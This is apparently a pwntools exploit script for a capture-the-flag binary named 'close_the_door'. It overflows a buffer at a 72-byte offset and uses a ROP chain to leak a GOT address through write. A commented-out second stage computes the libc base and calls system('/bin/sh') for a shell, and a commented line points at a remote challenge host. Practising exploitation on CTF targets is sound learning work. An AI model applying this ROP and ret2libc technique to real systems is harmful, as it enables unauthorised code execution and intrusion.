from pwn import *

context.os = 'linux'
context.arch = 'amd64'

offset = 72

binary = ELF("./close_the_door")

r = process("./close_the_door")

# r = remote('138.68.181.43', 32457)

libc = ELF("./1libc.so.6")

rop = ROP(binary)

rop.call(binary.symbols['write'], [
         1, [binary.symbols['got.read']], 1])
rop.call(binary.symbols['hidden_func'])
log.info("Stage I ROP Chain:\n" + rop.dump())

print(r.recvline())
r.sendline("xxxx")
print(r.recvline())
print(r.recvline())
print(r.recvline())
r.sendline("42")
print(r.recvline())
# r.recvuntil("\n")


payload = b"A"*offset + rop.chain()
r.sendline(payload)
r.recvline()


# print(r.recvuntil("\n"))

# for i in range(14):
#     r.recvline()

# leaked_puts = r.recvline()[:8].strip().ljust(8, b"\x00")

# log.success("Leaked puts@GLIBCL: "+str(leaked_puts))
# leaked_puts = u64(leaked_puts)
# libc.address = leaked_puts - libc.symbols['puts']
# rop2 = ROP(libc)
# rop2.puts(next(libc.search(b"/bin/sh\x00")))  # This line saved our ass
# rop2.system(next(libc.search(b"/bin/sh\x00")))

# log.info("Stage II ROP Chain:\n" + rop2.dump())


# payload = b"0 -65338\n2\n"
# payload += b"A"*offset + rop2.chain() + b"\n"

# r.sendline(payload)

# for i in range(13):
#     print(r.recvline())

# # r.sendline("ls")
# r.interactive()
